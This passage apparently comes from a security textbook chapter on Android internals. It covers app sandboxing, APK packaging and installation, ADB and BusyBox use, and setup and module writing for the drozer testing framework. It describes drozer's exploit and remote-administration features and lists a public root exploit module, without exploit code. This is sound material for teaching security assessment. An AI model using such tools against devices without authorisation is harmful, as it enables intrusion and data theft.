the device and so having root access is always advised. More concrete examples of some of\nthe constraints of assessing an application without having root access will be explored in later chapters. The\nInternet offers many guides on ways to root your specific device. An overview of typical ways to root an Android\ndevice appears later in this chapter in the “Rooting Explained” section.\nUnderstanding Android Applications\nThe majority of users experience Android applications through downloading them from the Play Store,\nreviewing the permission requirements presented to them (or not), and then installing. After the application has\nbeen installed, a new home screen icon appears that allows them to open the application, just as the developer\nintended. As a technical person, you should not feel satisfied with not knowing exactly how and why installation\nworked. What happened behind the scenes when you clicked the button to install that application? How did this\napplication reach your device? How did it go from a packaged download to an installed application that you can\nuse securely? These are all questions that you need to answer before you can be satisfied with moving onto\nassessing Android applications.\nReviewing Android OS Basics\nBefore exploring the weird and wonderful world of Android applications, take a step back and understand how\nthe operating system functions as a whole. You can view the Android OS as having two distinct sides to it: a\nstripped-down and modified Linux kernel and an application virtual machine that runs Java-like applications.\nThe differences between the mainline Linux kernel and the Android kernel have varied over the years and have\nstarted to lessen, but fundamental differences between how conventional Linux and Android operate remain.\nOn conventional Linux, applications that are started by a user are run under that user’s context. This model\nrelies on a user’s not installing malicious software on her computer because there are no protection\nmechanisms against accessing files that are owned by the same user that you are running as. In contrast to\nconventional Linux computing, each application that is installed on an Android device is assigned its own\nunique user identifier (UID) and group identifier (GID). In certain instances this statement does not hold true\nand applications can run under the same user, but these are covered later in this chapter under the “Application\nSandbox” section. A snipped output of running the ps command to display information about running processes\non an Android device is shown here:\nshell@android:/ $ ps\nUSER PID PPID VSIZE RSS WCHAN PC NAME\nroot 1 0 640 496 c00bd520 00019fb8 S /init\n...\nroot 46 1 4660 1200 ffffffff b6f61d14 S /system/bin/vold\nroot 48 1 9772 1268 ffffffff b6f1fd14 S /system/bin/netd\n...\nroot 52 1 225052 39920 ffffffff b6ecb568 S zygote\n...\nsystem 371 52 307064 46084 ffffffff b6ecc5cc S system_server\nu0_a7 424 52 255172 45060 ffffffff b6ecc5cc S com.android.systemui\n...\nradio 520 52 259604 25716 ffffffff b6ecc5cc S com.android.phone\nu0_a8 534 52 248952 56996 ffffffff b6ecc5cc S com.android.launcher\nu0_a9 789 52 244992 20612 ffffffff b6ecc5cc S com.android.mms\nu0_a16 819 52 246240 20104 ffffffff b6ecc5cc S com.android.calendar\n...\nu0_a37 1419 52 233948 17132 ffffffff b6ecc5cc S com.svox.pico\nroot 1558 61 928 496 c0010008 b6f57fa0 S /system/bin/sh\nu0_a52 1581 52 238060 25708 ffffffff b6ecc5cc S com.mwr.dz\nu0_a52 1599 52 240328 27076 ffffffff b6ecc5cc S com.mwr.dz:remote\n...\nroot 14657 1558 1236 464 00000000 b6f0b158 R ps\nIn this output, note that applications are running as different users. Newly installed applications are assigned\nUIDs sequentially from 10000 onward (until a maximum of 99999). You can observe this configuration in the\nAndroid source at\nhttps://android.googlesource.com/platform/system/core/+/master/include/private/android_filesystem_config.h\nThe user named u0_a0 has UID 10000, and similarly, a user named u0_a12 has UID 10012. Every Android\napplication has to be given a unique package name by its developer. The naming convention for these packages\nshould be all lowercase and the reverse Internet domain name of the organization that developed it. For\ninstance, if an application is named “battery saver” and it was developed by the fictitious “Amazing Utils”\ncompany then perhaps they could name the package com .amazingutils.batterysaver. This would almost\nguarantee a unique package name and any other application created by this organization could also have the\nprefix com.amazingutils that would allow logical grouping of their applications.\nIf you were to install this application on your device, you would see that it assigns a private data directory at the\nfollowing location on your device’s filesystem. On disk this may look something like the following:\nshell@android:/ # ls -l /data/data/\n...\ndrwxr-x--x u0_a46 u0_a46 2014-04-10 10:41\ncom.amazingutils.batterysaver\n...\nNotice that the owner of the folder is the newly created user for that application (u0_a46, which translates to\nUID 10046).\nThe Dalvik Virtual Machine (DVM) was specifically designed for the Android platform and is unique to it. The\nmain reason for its existence is that it was designed to run on hardware with processing and memory\nconstraints and is much lighter than the normal Java Virtual Machine. It was designed in a way that allows\nmany Dalvik VMs to be run at the same time in a memory-efficient manner. The code that runs on it is written\nand compiled to Java classes and then converted into a single DEX file using the dx SDK utility. The following is\nan example of compiling a simple Java JAR for Android without using an IDE. First, create a file named\nTest.java with the following content:\nclass Test\n{\npublic static void main(String[] args)\n{\nSystem.out.println(\"It works! :D\");\n}\n}\nIssue the following commands that will compile the class to normal Java bytecode, and then use the dx utility to\nconvert it to a JAR that contains Dalvik-compatible bytecode.\n$ javac Test.java\n$ dx –dex –output=test.jar Test.class\nWARNING\nYou need to use Java JDK6 and have it configured as your default for javac. Newer Java JDKs produce\nbytecode that is incompatible with the dx tool.\nThe JAR is now compiled and can be pushed to the device and executed using the dalvikvm or app_process\nbinaries on the device. The arguments provided to these binaries tell the Dalvik VM to look for the class named\nTest in /data/local/tmp/test.jar and execute the main function.\n$ adb push test.jar /data/local/tmp\n$ adb shell dalvikvm -cp /data/local/tmp/test.jar Test\nIt works :D\nThe previous code does not produce a full-fledged, installable application on Android. You must follow Android\npackage conventions and have the SDK automatically package your code into an installable Android package\nthat can be deployed onto a device. This example does, however, demonstrate the close link between Java and\nDalvik that exists. This could help Java developers transition into the world of Android and its internals.\nIntricate runtime internals are explored later in this chapter in “Looking Under the Hood.” In addition to this,\nAndroid 4.4 introduced a runtime replacement for Dalvik, named ART (Android Runtime), which promised to\nimprove the speed of applications drastically.\nGetting to Know Android Packages\nAn Android package is a bundle that gets installed on an Android device to provide a new application. This\nsection will explore the structure of packages and different ways that exist to install them on a device.\nObserving the Structure of a Package\nAndroid applications are distributed in the form of a zipped archive with the file extension of .apk, which stands\nfor Android Package. The official mime-type of an Android Package is application/vnd.android.package-\narchive. These packages are nothing more than zip files containing the relevant compiled application code,\nresources, and application metadata required to define a complete application. According to Google’s\ndocumentation at http://developer.android.com/tools/building/index.html, an APK is packaged by\nperforming the following tasks:\nAn SDK tool named aapt (Android Asset Packaging Tool) converts all the XML resource files included in the\napplication to a binary form. R.java is also produced by aapt to allow referencing of resources from code.\nA tool named aidl is used to convert any .aidl files (explored in Chapter 7 in “Attacking Insecure Services”)\nto .java files containing a converted representation of it using a standard Java interface.\nAll source code and converted output from aapt and aidl are compiled into .class files by the Java 1.6\ncompiler. This requires the android.jar file for your desired API version to be in the CLASSPATH environment\nvariable.\nThe dx utility is used to convert the produced .class files and any third-party libraries into a single\nclasses.dex file.\nAll compiled resources, non-compiled resources (such as images or additional executables), and the\napplication DEX file are used by the apkbuilder tool to package an APK file. More recent versions of the SDK\nhave deprecated the standalone apkbuilder tool and included it as a class inside sdklib.jar. The APK file is\nsigned with a key using the jarsigner utility. It can either be signed by a default debug key or if it is going to\nproduction, it can be signed with your generated release key.\nIf it is signed with a release key, the APK must be zip-aligned using the zipalign tool, which ensures that the\napplication resources are aligned optimally for the way that they will be loaded into memory. The benefit of\nthis is that the amount of RAM consumed when running the application is reduced.\nThis compilation process is invisible to you as the developer as these tasks are automatically performed by your\nIDE but are essential to understanding how code becomes a complete package. When you unzip an APK you see\nthe final product of all steps listed above. Note also that a very strictly defined folder structure is used by every\nAPK. The following is a high-level look at this folder structure:\n/assets\n/res\n/lib\n/META-INF\nAndroidManifest.xml\nclasses.dex\nresources.asrc\nAssets—Allows the developer to place files in this directory that they would like bundled with the\napplication.\nRes—Contains all the application activity layouts, images used, and any other files that the developer would\nlike accessed from code in a structured way. These files are placed in the raw/ subdirectory.\nLib—Contains any native libraries that are bundled with the application. These are split by architecture\nunder this directory and loaded by the application according to the detected CPU architecture; for example,\nx86, ARM, MIPS.\nMETA-INF—This folder contains the certificate of the application and files that hold an inventory list of all\nincluded files in the zip archive and their hashes.\nclasses.dex—this is essentially the executable file containing the Dalvik bytecode of the application. It is the\nactual code that will run on the Dalvik Virtual Machine.\nAndroidManifest.xml—the manifest file containing all configuration information about the application and\ndefined security parameters. This will be explored in detail later in this chapter.\nResources.asrc—Resources can be compiled into this file instead of being put into the res folder. Also\ncontains any application strings.\nInstalling Packages\nBehind the scenes, the process of downloading an application from the Play Store and installing it is actually\nquite a bit more complicated than one would imagine. The simplest way that Google could have implemented\nthis process is to have the Play Store application visit a website and allow the user to browse through the\napplication categories. When the user chooses to install an application Google would provide an “install” link\nand all that this does is download the APK file over HTTPS from the browser. What is wrong with this approach?\nWell, considering this method from a security point of view, how does the OS know that the downloaded\npackage came from the Play Store and is safe to install? The APK would be treated like every other download\nusing the browser and therefore no degree of trust can be afforded using this method.\nInstead, Google implemented a very modular and robust way to perform installations. When you click the\nInstall button on the Google Play application or website, functionality to deliver and install the application is\ninvoked on the device via the GTalkService. This functionality works from a system application on every\nAndroid device and maintains a connection to Google infrastructure via a pinned SSL connection. Various other\nservices such as the Android Device Manager or Google Cloud Messaging (GCM) make use of the GTalkService.\nThe installation process via the GTalkService was explored in an excellent blog post by Jon Oberheide at\nhttps://jon.oberheide.org/blog/2010/06/28/a-peek-inside-the-gtalkservice-connection/. The\nGTalkService gracefully handles cases where the device on which you are installing an application is offline or\nin a low-signal area. It simply queues the message and delivers it when the device comes online. One of the\nreasons Android is considered so “open and free” is that so many different ways exist to find and install Android\napplications. Google does not force users to make use of its Play Store and users can make use of many other\napplication stores instead. Some device vendors and phone carriers like to include their own app stores on\ndevices they sell. A good example of this is the Samsung Apps application that is included on all Samsung\ndevices. Other such examples of popular alternative app stores include Amazon Appstore, GetJar, SlideMe, F-\nDroid, and a number of big players in the Eastern markets.\nIn addition to these application stores, multiple ways exist to install new applications onto your device by simply\nhaving access to the APK that you would like to install. Making use of an Android SDK tool named ADB\n(Android Debug Bridge) is one of the simplest ways to do this. Assuming a correct SDK installation, ADB will be\non your PATH. Issuing the following command will install an APK onto a connected device or emulator:\n$ adb install /path/to/yourapplication.apk\nTIP\nInstalling the APK requires USB Debugging to be turned on in the settings and a physical connection from\nyour device to your computer.\nOn Android 4.2.2 and later, making an ADB connection may require you to accept a prompt allowing your\ncomputer to connect. The install command of ADB works behind the scenes invoking the package manager on\nthe device (/system/bin/pm). Package Manager can perform a number of actions, including listing all installed\npackages, disabling an application that came with the device that you consider unnecessary “bloatware,” or\nobtaining the installed path to a particular application. For all the available options, type the following command\nand observe the output:\n$ adb shell pm\nAnother way to install an application could be to host it on a web server. Some application developers choose\nnot to put their application on any app stores and rather serve it from their website. These sites often check for\nAndroid browser user agent strings and automatically start the download of their APK. A simple method of\nhosting the contents of your current folder using Python can be done as follows:\n$ python -m SimpleHTTPServer\nServing HTTP on 0.0.0.0 port 8000 ...\n10.0.0.100 - - [04/May/2014 22:27:14] \"GET /agent.apk HTTP/1.1\" 200 -\nBrowse to http://your_computer_ip:8000 on your device and click on the APK you want to install. You will be\nprompted with an installation activity.\nNOTE\nTo install an APK by browsing to it on a web server you must first select the Unknown sources box in your\ndevice settings.\nOther techniques may exist to install applications; however, the ones mentioned here are reliable and work on\nany device regardless of whether you have root access on it. Other ways may include SSH access to the device or\neven other installer desktop applications, but these are non-standard ways to perform installations and require\nadditional tools.\nUsing Tools to Explore Android\nThe best way to learn the internals of Android and become familiar with the way it works is to explore an\nemulator or device armed with some basic knowledge about it. By exploring Android and becoming comfortable\nwith its internals, you will have the ability to investigate features for which no public information exists.\nA simple example of this type of exploration is observing—through inspection of the tool or reading the source\ncode—how some of the standard SDK tools work.\nADB\nFor instance, when installing an application on the device you may see the following output:\n$ adb install application.apk\n541 KB/s (156124 bytes in 0.236s)\npkg: /data/local/tmp/application.apk\nSuccess\nThis output shows that the user who runs adbd (which is typically “shell” on a normal non-rooted device) has\nthe ability to read, write, and execute files in the /data/local/tmp directory. When exploring a device that is not\nrooted, you can use this directory but have insufficient privileges to access the /data parent directory.\nADB is the single most useful SDK tool for exploring Android. The following is a list of common tasks that you\ncan perform using ADB:\nList connected devices—$ adb devices\nGet a shell on a device—$ adb shell\nPerform a shell command and return—$ adb shell <command>\nPush a file to a device—$ adb push /path/to/local/file /path/on/android/device\nRetrieve a file from a device—$ adb pull /path/on/android/device /path/to/local/file\nForward a TCP port on the local host to a port on the device—$ adb forward tcp:<local_port>\ntcp:<device_port>\nView the device logs—$ adb logcat\nIf more than one device is connected, prepend the ADB command with -s <device_id>. If you have one\nconnected device and one emulator, instead of providing their device IDs with the -s argument, you can use -d\n(for device) and -e (for emulator).\nSome Android devices may come with a very limited set of utilities installed by default, and having additional\ntools installed that ease the process of exploring the device is useful.\nBusyBox\nBusyBox incorporates a large variety of standard Linux utilities into a single binary. A common misconception\nabout running BusyBox on Android is that it requires root. This is incorrect, and users should be aware that\nexecuting a BusyBox binary runs it under the same user account and privilege context of the calling process. You\ncan compile BusyBox with the utilities you require or download a pre-compiled binary that includes many\nutilities. At the time of this writing, the BusyBox website provided pre-compiled binaries for many architectures\nat http://www.busybox.net/downloads/binaries/. This includes ARM, which is the CPU architecture used by\nthe majority of Android devices. You can download a BusyBox binary for the correct architecture (ARMv7 in this\ncase) from the site and then upload it to the /data/local/tmp directory on your Android device without the need\nfor root access using the following command:\n$ adb push busybox-armv7l /data/local/tmp\n77 KB/s (1109128 bytes in 14.041s)\nGet a shell on the device, browse to /data/local/tmp, and mark it executable using the following command:\nshell@android:/ $ cd /data/local/tmp\nshell@android:/data/local/tmp $ chmod 755 busybox-armv7l\nHere is an output of the available tools provided by BusyBox:\nshell@android:/data/local/tmp $ ./busybox-armv7l\n./busybox-armv7l\nBusyBox v1.21.1 (2013-07-08 10:26:30 CDT) multi-call binary.\n...\nacpid, add-shell, addgroup, adduser, adjtimex, arp, arping, ash,\nawk, base64, basename, beep, blkid, blockdev, bootchartd, brctl,\nbunzip2, bzcat, bzip2, cal, cat, catv, chat, chattr, chgrp, chmod,\nchown, chpasswd, chpst, chroot, chrt, chvt, cksum, clear, cmp, comm,\nconspy, cp, cpio, crond, crontab, cryptpw, cttyhack, cut, date, dc, dd,\ndeallocvt, delgroup, deluser, depmod, devmem, df, dhcprelay, diff,\ndirname, dmesg, dnsd, dnsdomainname, dos2unix, du, dumpkmap,\ndumpleases, echo, ed, egrep, eject, env, envdir, envuidgid, ether-wake,\nexpand, expr, fakeidentd, false, fbset, fbsplash, fdflush, fdformat,\nfdisk, fgconsole, fgrep, find, findfs, flock, fold, free, freeramdisk,\nfsck, fsck.minix, fsync, ftpd, ftpget, ftpput, fuser, getopt, getty,\ngrep, groups, gunzip, gzip, halt, hd, hdparm, head, hexdump, hostid,\nhostname, httpd, hush, hwclock, id, ifconfig, ifdown, ifenslave,\nifplugd, ifup, inetd, init, insmod, install, ionice, iostat, ip,\nipaddr, ipcalc, ipcrm, ipcs, iplink, iproute, iprule, iptunnel,\nkbd_mode, kill, killall, killall5, klogd, last, less, linux32, linux64,\nlinuxrc, ln, loadfont, loadkmap, logger, login, logname, logread,\nlosetup, lpd, lpq, lpr, ls, lsattr, lsmod, lsof, lspci, lsusb, lzcat,\nlzma, lzop, lzopcat, makedevs, makemime, man, md5sum, mdev, mesg,\nmicrocom, mkdir, mkdosfs, mke2fs, mkfifo, mkfs.ext2, mkfs.minix,\nmkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modinfo, modprobe, more,\nmount, mountpoint, mpstat, mt, mv, nameif, nanddump, nandwrite,\nnbd-client, nc, netstat, nice, nmeter, nohup, nslookup, ntpd, od,\nopenvt, passwd, patch, pgrep, pidof, ping, ping6, pipe_progress,\npivot_root, pkill, pmap, popmaildir, poweroff, powertop, printenv,\nprintf, ps, pscan, pstree, pwd, pwdx, raidautorun, rdate, rdev,\nreadahead, readlink, readprofile, realpath, reboot, reformime,\nremove-shell, renice, reset, resize, rev, rm, rmdir, rmmod, route, rpm,\nrpm2cpio, rtcwake, run-parts, runlevel, runsv, runsvdir, rx, script,\nscriptreplay, sed, sendmail, seq, setarch, setconsole, setfont,\nsetkeycodes, setlogcons, setserial, setsid, setuidgid, sh, sha1sum,\nsha256sum, sha3sum, sha512sum, showkey, slattach, sleep, smemcap,\nsoftlimit, sort, split, start-stop-daemon, stat, strings, stty, su,\nsulogin, sum, sv, svlogd, swapoff, swapon, switch_root, sync, sysctl,\nsyslogd, tac, tail, tar, tcpsvd, tee, telnet, telnetd, test, tftp,\ntftpd, time, timeout, top, touch, tr, traceroute, traceroute6, true,\ntty, ttysize, tunctl, udhcpc, udhcpd, udpsvd, umount, uname, unexpand,\nuniq, unix2dos, unlzma, unlzop, unxz, unzip, uptime, users, usleep,\nuudecode, uuencode, vconfig, vi, vlock, volname, wall, watch, watchdog,\nwc, wget, which, who, whoami, whois, xargs, xz, xzcat, yes, zcat, zcip\nThis is a huge set of tools, many of which do not come as part of the Android image. Some of these tools are\ncommon utilities used on a desktop or server version of Linux, such as cp and grep, which the Android image\ninconveniently left out. Do not expect all the included tools to work fully, because some aspects of Android\nsimply do not work the same as on conventional Linux systems. You can add BusyBox to the shell’s PATH\nenvironment temporarily without root by entering the following command:\nshell@android:/ $ export PATH=$PATH:/data/local/tmp\nStandard Android Tools\nSome useful tools that are present on Android systems in the /system/bin directory include the following:\npm—This stands for “package manager” and is the command-line package management utility on Android. It\nperforms all tasks relating to installation, uninstallation, disabling, and information retrieval of installed\npackages. Some useful commands are:\nList all installed packages—shell@android:/ $ pm list packages\nFind the stored APK path of an installed application—shell@android:/ $ pm path\n<package_name>\nInstall a package—shell@android:/ $ pm install /path/to/apk\nUninstall a package—shell@android:/ $ pm uninstall <package_name>\nDisable an installed application (useful for disabling pesky applications that came with your\ndevice)—shell@android:/ $ pm disable <package_name>\nlogcat—This tool allows you to view system and application logs with flexible filters. This tool can only be\ninvoked by applications or users on the device that have the associated privilege level to do so.\nIf you would like to view all logs, simply run—shell@android:/ $ logcat\nIf you know the name of the tag you are looking for then you can filter by it\nusing—shell@android:/ $ logcat -s tag\nNOTE\nYou can also use logcat directly from ADB by running adb logcat from a connected computer.\ngetprop—This tool allows you to retrieve all system properties including verbose hardware and software\ninformation.\ndumpsys—This tool displays information about the status of system services. If run without any arguments it\niterates through all system services. You can also find these services by running service list.\ndrozer\ndrozer is an Android assessment tool that was released in March 2012 at Blackhat EU under the name Mercury.\nIts original intention was to eliminate the need for writing one-use applications that test for a certain issue, and\nit has evolved into a full testing suite. It was created because of the need to test each aspect of an Android\napplication in a dynamic way. Put simply, drozer has two distinct use cases:\nFinding vulnerabilities in applications or devices—It allows you to assume the role of an installed\nAndroid application and interact with other apps and the underlying operating system in search of\nvulnerabilities.\nProviding exploits and useful payloads for known vulnerabilities—It does this by building\nmalicious files or web pages that exploit known vulnerabilities to install drozer as a remote administration\ntool.\nChapter 7 focuses heavily on using drozer to find vulnerabilities, and Chapter 8 delves into the darker side of\ndrozer and ways of using provided exploits to gain access to Android devices as an attacker.\ndrozer has two different versions: the community and pro editions. The community edition provides the raw\npower of drozer and gives the user access to a command-line interface only. It is also a fully open-source project\nthat was released under a 3-clause BSD license. The professional version focuses on features that make doing\nAndroid security testing easy for people who do it as a part of their job. It provides a graphical user interface that\nmakes visualizing the large amount of information that can be collected during the course of a typical security\nassessment of an Android device easier. Throughout the following chapters, the community edition of drozer is\nused for two reasons: It is free, and it facilitates the learning of Android security better than the pro version,\nmainly because it does not shield you from what it is doing under the hood. For more information about the\ndifferences, see the tool’s homepage at https://www.mwrinfosecurity.com/products/drozer/.\nHow drozer Works\ndrozer is a distributed system that makes use of some key components:\nAgent— A lightweight Android application that runs on the device or emulator being used for testing. There\nare two versions of the agent, one that provides a user interface and embedded server and another that does\nnot contain a graphical interface and can be used as a Remote Administration Tool on a compromised device.\nSince version 2.0, drozer supports “Infrastructure mode,” in which the agent establishes a connection\noutward to traverse firewalls and NAT. This allows more realistic attack scenarios to be created and requires\na drozer server.\nConsole—A command-line interface running on your computer that allows you to interact with the device\nthrough the agent.\nServer—Provides a central point where consoles and agents can rendezvous, and routes sessions between\nthem.\nThese components use a custom protocol named drozerp (drozer protocol) to exchange data. The agent is\nsomewhat of an empty shell that knows only how to run commands it receives from the console and provide the\nresult. A very technically brilliant method of using the Java Reflection API facilitates the execution of code from\nPython in the console to Java on the agent. This means that from Python code it is possible to instantiate and\ninteract with Java objects on the connected device.\nInstalling drozer\nTo set up drozer, visit https://www.mwrinfosecurity.com/products/drozer/community-edition/ and download\nthe package that is appropriate for your platform (Linux, Windows, or Mac). For standard application testing\npurposes, the tool requires only two parts: an agent application that needs to be installed on your Android device\nand a console that is run from your computer. You will require the following to install drozer successfully on\nyour computer:\nPython 2.7\nJava Development Kit (JDK) 1.6\nAndroid SDK\nADB on your PATH\nJava on your PATH\nThe drozer agent can be installed on your Android device using ADB. It is included as agent.apk in all download\npackages or as a separate package on the download page. To install the agent on your device, perform the\nfollowing command:\n$ adb install agent.apk\nFor more verbose information about installing drozer, please refer to the user guide presented on the download\npage.\nStarting a Session\nYou must first set up suitable port forwarding from your device or emulator to your computer because the\nembedded server in the drozer agent listens on TCP port (31415 by default). Perform the following command to\nforward this port to your computer:\n$ adb forward tcp:31415 tcp:31415\nYou can now open the drozer agent on the device and turn on the Embedded Server option as shown in Figure\n6.3.\nFigure 6.3 The main activity of the drozer agent displaying the embedded server toggle.\nOn your computer you can now perform the following command to connect to your agent:\n$ drozer console connect\nYou should now see a drozer command prompt that confirms your device ID and looks as follows:\nSelecting 1f3213a063299199 (unknown sdk 4.4.2)\n.. ..:.\n..o.. .r..\n..a.. . ....... . ..nd\nro..idsnemesisand..pr\n.otectorandroidsneme.\n.,sisandprotectorandroids+.\n..nemesisandprotectorandroidsn:.\n.emesisandprotectorandroidsnemes..\n..isandp,..,rotectorandro,..,idsnem.\n.isisandp..rotectorandroid..snemisis.\n,andprotectorandroidsnemisisandprotec.\n.torandroidsnemesisandprotectorandroid.\n.snemisisandprotectorandroidsnemesisan:\n.dprotectorandroidsnemesisandprotector.\ndrozer Console (v2.3.4)\ndz>\nUsing the drozer Console\nThe drozer console is essentially a command-line interface that allows you to run modules currently installed in\nthe framework. To find the available modules, use the list command. Running this command without any\narguments will give a list of all available modules, and providing it with an argument filters the module list by\nthat keyword. The following shows an example:\ndz> list package\napp.package.attacksurface Get attack surface of package\napp.package.backup Lists packages that use backup API (returns\ntrue on FLAG_ALLOW_BACKUP)\napp.package.debuggable Find debuggable packages\napp.package.info Get information about installed packages\napp.package.launchintent Get launch intent of package\napp.package.list List Packages\napp.package.manifest Get AndroidManifest.xml of package\n...\nTIP\nThe list command inside drozer can be shortened to ls. This can save you time if you are using drozer\noften.\nSome modules do not come as part of the standard drozer installation. This is because they are seen as\nadditional modules that may not be used regularly or are specialized for a certain task such as installing an\nadditional tool or a root exploit for a certain device. You search for modules from the online central module\nrepository using the module search command. Here -d is used to show module descriptions:\ndz> module search -d\n...\nmetall0id.root.cmdclient\nExploit the setuid-root binary at /system/bin/cmdclient on certain\ndevices to gain a root shell. Command injection vulnerabilities exist\nin the parsing mechanisms of the various input arguments.\nThis exploit has been reported to work on the Acer Iconia, Motorola\nXYBoard and Motorola Xoom FE.\n...\nmetall0id.tools.setup.nmap\nInstalls Nmap on the Agent.\nNmap (\"Network Mapper\") is a free and open source (license) utility\nfor network discovery and security auditing.\nmwrlabs.develop\nStart a Python shell, in the context of a drozer module.\nYou can also search available modules for specific keywords contained within their descriptions or names by\nproviding a keyword to module search. This functionality can also be invoked from outside of a drozer console\nby using the drozer module command from your terminal. The searched module repository is at\nhttps://github.com/mwrlabs/drozer-modules/.\nModules are organized into namespaces that group specific functions. Table 6.1 details the default namespaces;\nhowever, drozer module developers may choose to create additional namespaces.\nTable 6.1 A List of drozer Namespaces and the Purpose of the Modules in Each\nNAMESPACE DESCRIPTION\napp.activity Find and interact with activities exported by applications.\napp.broadcast Find and interact with broadcast receivers exported by applications.\napp.package Find packages installed on a device, and display information about them.\napp.provider Find and interact with content providers exported by applications.\napp.service Find and interact with services exported by applications.\nauxiliary Useful tools that have been ported to drozer.\nexploit.pilfer Public exploits that extract sensitive information from vulnerable applications through various\nmeans.\nexploit.root Publicly available root exploits for Android devices.\ninformation Extract additional information about a device and its configuration.\nscanner Find common vulnerabilities in applications or devices with automatic scanners.\nshell Interact with the underlying Linux OS through a shell.\ntools.file Perform operations on files; e.g., copy files to and from the device.\ntools.setup Upload additional utilities on the device for use inside drozer; e.g., busybox.\nA good way to understand what an unprivileged application has access to on a device is by using the drozer shell.\nLaunch it and issue an id command as shown here:\ndz> shell\nu0_a59@android:/data/data/com.mwr.dz $ id\nuid=10059(u0_a59) gid=10059(u0_a59) groups=3003(inet),50059(all_a59)\ncontext=u:r:untrusted_app:s0\nu0_a59@android:/data/data/com.mwr.dz $\nRemember that UIDs are assigned sequentially from 10000 upwards, and more about how the groups are\nassigned to an application is explained later in this section in “Inspecting the Android Permission Model”.\nYou can find more information about what a module does and its command-line parameters by using the help\ncommand within the console. Alternatively, use -h inline when executing a command as shown here:\ndz> run app.package.info -a com.mwr.dz -h\nAnother useful feature of the console is the ability to redirect any output from a module to a file. You can do this\nin the same manner as you do it on the terminal using the > character like so:\ndz> run app.package.info -a com.mwr.dz > /path/to/output.txt\nFor other useful semantics and shortcuts, refer to the drozer user guide on the project’s download page.\nWriting Your Own Basic Modules\nFor you to get used to drozer’s complex way of executing Java from Python and help with module development\nin general, installing the following module is crucial:\ndz> module install mwrlabs.develop\nProcessing mwrlabs.develop... Done.\nSuccessfully installed 1 modules, 0 already installed.\nThis module provides an interactive shell to test the instantiation of objects, retrieval of constant values, and\nexecution of methods. For example, suppose you want to create a module that returns the package’s name when\nprovided with an application’s UID. You could test it first using the auxiliary.develop .interactive module\nthat was installed previously.\ndz> run auxiliary.develop.interactive\nEntering an interactive Python shell. Type 'c' to end.\n> /home/tyrone/dz-repo/mwrlabs/develop.py(24)execute()\n-> self.pop_completer()\n(Pdb) context = self.getContext()\n(Pdb) pm = context.getPackageManager()\n(Pdb) name = pm.getNameForUid(10059)\n(Pdb) print name\ncom.mwr.dz\ndrozer provides some “common library” commands to help alleviate reimplementation of common tasks. You\ncan find them defined in the /src/drozer/modules/common/ folder of the drozer console source code. The\nself.getContext() function used previously is a helper function that provides a handle on Android Context,\nwhich can be elusive at times. An equivalent Java implementation of the preceding code could be the following:\nContext context = getApplicationContext();\nPackageManager pm = context.getPackageManager();\nString name = pm.getNameForUid(10059);\nTurning this simple concept into a fully functioning drozer module may look as follows:\nfrom drozer.modules import Module\nclass GetPackageFromUID(Module):\nname = \"Get a package's name from the given UID\"\ndescription = \"Get a package's name from the given UID\"\nexamples = \"\"\"\ndz> run app.package.getpackagefromuid 10059\nUID 10059 is com.mwr.dz\n\"\"\"\nauthor = \"Tyrone\"\ndate = \"2014-05-30\"\nlicense = \"BSD (3 clause)\"\npath = [\"app\", \"package\"]\npermissions = [\"com.mwr.dz.permissions.GET_CONTEXT\"]\ndef add_arguments(self, parser):\nparser.add_argument(\"uid\", help=\"uid of package\")\ndef execute(self, arguments):\ncontext = self.getContext()\npm = context.getPackageManager()\nname = pm.getNameForUid(int(arguments.uid))\nself.stdout.write(\"UID %s is %s\\n\\n\" % (arguments.uid, name))\nSaving the newly created module in a file with extension .py in a local repository allows access to it from drozer.\nCreating a local repository can be done using the following command from the console (or similarly using the\ndrozer command from the terminal).\ndz> module repository create /path/to/repository\nRunning your newly created module produces the following output:\ndz> run app.package.getpackagefromuid 10059\nUID 10059 is com.mwr.dz\nDuring development of a module, turning on debugging mode on the console by invoking it with --debug may be\nuseful. This command prints any errors produced by the loading or running of the module to the screen. For\nmore advanced examples of developing modules, refer to the drozer documentation or read the source code of\nother similar modules for a deeper insight.\nIntroduction to Application Components\nAndroid applications and their underlying frameworks were designed in a way that keeps them modular and\nable to communicate with each other. The communication between applications is performed in a well-defined\nmanner that is strictly facilitated by a kernel module named binder, which is an Inter-Process Communication\n(IPC) system that started as the OpenBinder project and was completely rewritten in 2008 for use on Android. It\nis implemented as a character device located at /dev/binder, which applications interact with through multiple\nlayers of abstraction.\nAndroid applications can make use of four standard components that can be invoked via calls to binder.\nActivities—Activities represent visual screens of an application with which users interact. For example,\nwhen you launch an application, you see its main activity. Figure 6.4 shows the main activity of the clock\napplication.\nServices—Services are components that do not provide a graphical interface. They provide the facility to\nperform tasks that are long running in the background and continue to work even when the user has opened\nanother application or has closed all activities of the application that contains the service. To view running\nservices on your device go to the Running tab in the Application Manager, as shown in Figure 6.5.\nTwo different modes of operation exist for services. They can be started or bound to. A service that is started\nis typically one that does not require the ability to communicate back to the application that started it. A\nbound service provides an interface to communicate back results to the calling application. A started service\ncontinues to function even if the calling application has been terminated. A bound service only stays alive for\nthe time that an application is bound to it.\nBroadcast receivers—Broadcast receivers are non-graphical components that allow an application to\nregister for certain system or application events. For instance, an application that requires a notification\nwhen receiving an SMS would register for this event using a broadcast receiver. This allows a piece of code\nfrom an application to be executed only when a certain event takes place. This avoids a situation where any\npolling needs to take place and provides a powerful event-driven model for applications. In contrast to other\napplication components, a broadcast receiver can be created at runtime.\nContent providers—These are the data storehouses of an application that provide a standard way to\nretrieve, modify, and delete data. The terminology used to define and interact with a content provider is\nsimilar to SQL: query, insert, update, and delete. This component is responsible for delivering an\napplication’s data to another in a structured and secure manner. The developer defines the back-end\ndatabase that supports a content provider, but a common choice is SQLite (see http://www.sqlite.org/),\nbecause Android makes the implementation of SQLite so easy due to their similar structures. Defining a\ncontent provider that can retrieve files and serve them is also possible. This may provide a preferable\napproach for applications that implement access control on the retrieval of their files from other\napplications.\nFigure 6.4 The main activity of the clock application\nFigure 6.5 A list of running services on a device and the applications they belong to\nDefining Components\nEach Android package contains a file named AndroidManifest.xml in the root of the archive. This file defines the\npackage configuration, application components, and security attributes. Figure 6.6 shows an example manifest.\nFigure 6.6 A simple manifest file showing the general structure\nOnly components that are defined in the manifest file are usable inside the application, with the exception of\nbroadcast receivers. One of the most important aspects of securing defined components in the manifest is using\nstrongly configured permissions, which is explored in detail later in this chapter in “Understanding\nPermissions”.\nInteracting with Components\nAn intent is a defined object used for messaging that is created and communicated to an intended application\ncomponent. This communication is done through calls to binder. It includes all 